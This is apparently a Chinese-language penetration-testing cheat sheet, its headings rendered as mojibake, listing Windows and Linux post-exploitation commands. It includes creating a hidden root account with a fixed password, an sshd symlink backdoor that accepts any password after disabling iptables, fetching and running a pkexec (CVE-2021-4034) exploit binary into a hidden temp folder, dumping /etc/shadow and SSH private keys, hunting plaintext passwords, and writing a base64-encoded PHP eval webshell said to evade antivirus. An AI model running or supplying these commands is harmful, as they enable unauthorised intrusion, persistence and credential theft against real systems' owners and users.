reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fSingleSessionPerUser /t REG\_DWORD /d 0 /f

---

### Win-æŸ¥çœ‹å†å²å‘½ä»¤

type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt  
type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt

---

### Win-è®¡ç®—æ–‡ä»¶hash

certutil.exe -hashfile 1.txt

---

### Win-å¼ºåˆ¶åœæ­¢è¿›ç¨‹

åœæ­¢æŒ‡å®špidè¿›ç¨‹ taskkill /f /pid 3352  
åœæ­¢æŒ‡å®šexe taskkill /f /im explor.exe

---

## Linux

### Linux-æƒé™ç»´æŒ

ğŸš€åˆ›å»ºRootæƒé™è´¦æˆ·  
useradd -p openssl passwd -1 -salt 'support' Passw0rd -o -u 0 -g root -G root -s /bin/bash -d /home/support  
ğŸš€åˆ›å»ºæ™®é€šæƒé™è´¦æˆ·  
useradd -p openssl passwd -1 -salt 'support' Passw0rd support  
ğŸš€åˆ›å»ºRootæƒé™è´¦æˆ·  
useradd -p openssl passwd -1 -salt 'support' Passw0rd -o -u 0 -g root -G root -s /bin/bash -d /home/support  
ğŸš€åˆ›å»ºæ™®é€šæƒé™è´¦æˆ·  
useradd -p openssl passwd -1 -salt 'support' Passw0rd support  
ğŸš€è½¯é“¾æ¥åé—¨  
åé—¨æ¤å…¥  
service iptables stop  
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort\=20020  
åé—¨è¿æ¥ è¾“å…¥ä»»æ„å¯†ç ï¼ŒæˆåŠŸç™»å½•  
ssh root@IP -p 20020

---

### Linux-æƒé™æå‡

ğŸš€SUIDææƒ  
find / -perm -u\=s -type f 2> /dev/null  
SUIDææƒ  
å…·æœ‰ææƒåŠŸèƒ½çš„Linuxå¯æ‰§è¡Œæ–‡ä»¶æœ‰:nmap vim find bash more less nano cp  
ğŸš€PKEXECææƒ(CVE-2021-4034)  
wget --no-check-certificate https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/exploit -O /tmp/.ICE-unix/run 2>&1 > /dev/null  
chmod +x /tmp/.ICE-unix/run  
/tmp/.ICE-unix/run

---

### Linux-æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬

cat /etc/issue //æŸ¥çœ‹ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬ä¿¡æ¯  
cat /etc/\*-release  
cat /etc/lsb-release //Debian  
cat /etc/redhat-release //Redhat

---

### Linux-æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ã€æ˜¯å¦ä¸º64ä½

cat /proc/version  
uname -a // æŸ¥çœ‹å†…æ ¸ã€æ“ä½œç³»ç»Ÿã€CPUä¿¡æ¯  
uname -mrs  
rpm -q kernel  
dmesg | grep Linux  
ls /boot | grep wmlinuz-

---

### Linux-æŸ¥çœ‹ç¯å¢ƒå˜é‡

cat /etc/profile  
cat /etc/bashrc  
cat \~/.bash\_profile  
cat \~/.bashrc  
cat \~/.bash\_logout  
env  
set  
æŸ¥çœ‹æ˜¯å¦æœ‰æ‰“å°æœº: lpstat -a

---

### Linux-è·å–åº”ç”¨ç¨‹åºåŠæœåŠ¡ä¿¡æ¯

æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„ç¨‹åºåŠå¯¹åº”çš„ç”¨æˆ·æƒé™:  
ps aux  
ps -ef  
top  
cat /etc/services  
æŸ¥çœ‹ä»¥rootæƒé™è¿è¡Œçš„è¿›ç¨‹:  
ps aux | grep root  
ps -ef | grep root  
æŸ¥çœ‹å®‰è£…çš„åº”ç”¨:  
ls -alh /usr/bin/  
ls -alh /sbin/  
dpkg -l  
rpm -qa  
ls -alh /var/cache/apt/archives  
ls -alh /var/cache/yum/

---

### Linux-è·å–æœåŠ¡åŠé…ç½®æ–‡ä»¶ä¿¡æ¯

cat /etc/syslog.conf  
cat /etc/chttp.conf  
cat /etc/lighttpd.conf  
cat /etc/cups/cupsd.conf  
cat /etc/inetd.conf  
cat /etc/apache2/apache2.conf  
cat /etc/my.conf  
cat /etc/httpd/conf/httpd.conf  
ls -aRI /etc/ | awk '\$1 \~ /\^.r./'

---

### Linux-è·å–è®¡åˆ’ä»»åŠ¡ä¿¡æ¯

crontab -l  
ls -alh /var/spool/cron  
ls -al /etc/ | grep cron  
ls -al /etc/cron\*  
cat /etc/cron\*  
cat /etc/at.allow  
cat /etc/at.deny  
cat /etc/cron.allow  
cat /etc/cron.deny  
cat /etc/crontab  
cat /etc/anacrontab  
cat /var/spool/cron/crontabs/root

---

### Linux-è·å–ç”¨æˆ·ä¿¡æ¯

id  
who  
w  
last  
cat /etc/passwd  
cat /etc/group  
cat /etc/shadow  
grep -v -E "\^#"/etc/passwd | awk -F: '\$3 \=\= 0 {print \$1}'  
awk -F:'(\$3 \=\= "0") {print}' /etc/passwd  
cat /etc/sudoers  
sudo -l  
ls -ahlR /root/

---

### Linux-æŸ¥æ‰¾é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç 

cat /var/apache2/config.inc  
cat /var/lib/mysql/mysql/user.MYD  
cat /root/anaconda-ks.cfg

---

### Linux-æŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„æ“ä½œè®°å½•

cat \~/.bash\_history  
cat \~/.nano\_history  
cat \~/.atftp\_history  
cat \~/.mysql\_history  
cat \~/.php\_history

---

### Linux-æŸ¥çœ‹sshç§é’¥

cat \~/.ssh/authorized\_keys  
cat \~/.ssh/identity.pub  
cat \~/.ssh/identity  
cat \~/.ssh/id\_rsa.pub  
cat \~/.ssh/id\_rsa  
cat \~/.ssh/id\_dsa.pub  
cat \~/.ssh/id\_dsa  
cat /etc/ssh/ssh\_config  
cat /etc/ssh/sshd\_config  
cat /etc/ssh/ssh\_host\_dsa\_key.pub  
cat /etc/ssh/ssh\_host\_dsa\_key  
cat /etc/ssh/ssh\_host\_rsa\_key.pub  
cat /etc/ssh/ssh\_host\_rsa\_key  
cat /etc/ssh/ssh\_host\_key.pub  
cat /etc/ssh/ssh\_host\_key

---

### Linux-è·å–å­˜å‚¨çš„æ˜æ–‡ç”¨æˆ·åã€å¯†ç 

grep -i user [filename]  
grep -i pass [filename]  
grep -C 5 "password" [filename]  
find . -name "\*.php" -print0 | xargs -0 grep -i -n "var \$password"

---

### Linux-è·å–ç½‘ç»œä¿¡æ¯

æŸ¥çœ‹å½“å‰ç½‘ç»œåœ°å€:  
/sbin/ifconfig -a  
cat /etc/network/interfaces  
cat /etc/susconfig/network  
æŸ¥çœ‹ç½‘ç»œé…ç½®ã€DNSã€ DHCPã€ç½‘å…³:  
cat /etc/resolv.conf  
cat /etc/sysconfig/network  
cat /etc/networks  
iptables -L  
hostname //æŸ¥çœ‹è®¡ç®—æœºå  
dnsdomainname  
æŸ¥çœ‹ç½‘ç»œé€šä¿¡:  
lsof -i  
lsof -i :80  
grep 80 /etc/services  
netstat -antup  
netstat -antpx  
netstat -tulpn  
chkconfig --list  
chkconfig --list | grep 3:on  
æŸ¥çœ‹ç¼“å­˜:  
arp -e  
route  
/sbin/route -nee

---

### Linux-å…¶ä»–å¸¸ç”¨å‘½ä»¤

linuxè®¾ç½®ç»ˆç«¯ä»£ç†ï¼š export https\_proxy\=http://127.0.0.1:7890 http\_proxy\=http://127.0.0.1:7890 all\_proxy\=socks5://127.0.0.1:7890  
linxç»ˆç«¯æœç´¢è½¯ä»¶ï¼š find / -name pass.txt  
linuxæŸ¥æ‰¾åç¼€propertiesæ–‡ä»¶å†…å®¹å¸¦passwordå­—æ ·ï¼š find / -name \*.properties | xargs grep password //xml,sh,pythonç­‰ç­‰  
linuxæŠŠtomcatç›®å½•æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨å¯¼å‡ºåˆ°oa.txtï¼š find /home/tomcat/ -type f > oa.txt  
ç¼–ç å­—ç¬¦base64ç„¶åechoè¾“å‡ºlogo.phpå†è¿›è¡Œè§£ç ï¼š echo -n "PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+" | base64 -d > logo.php //å¯ç»•è¿‡æ€è½¯æ‹¦æˆªå…³é”®å­—

---

### Linux-ç«¯å£è½¬å‘

LCX:  
lcx -  
cx -listen 4567 33891 #Attacker  
lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets  
SSH:  
ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]  
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port  
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port  
mknod:  
mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe  
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe  
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)  
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)  
éš§é“:  
ssh -D 127.0.0.1:9050 -N [username]@[ip]  
proxychains ifconfig

---

### Linux-æŸ¥æ‰¾æ–‡ä»¶

find / -name passwd

---

### Linux-å†™æ–‡ä»¶

echo xxxxx== |base64 -d > /var/www/html/1.jsp

---

### Linux-ç½‘ç»œPingæ¢æµ‹

for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 \$i &>/dev/null; then echo \$i is alived; fi; done

â€

â€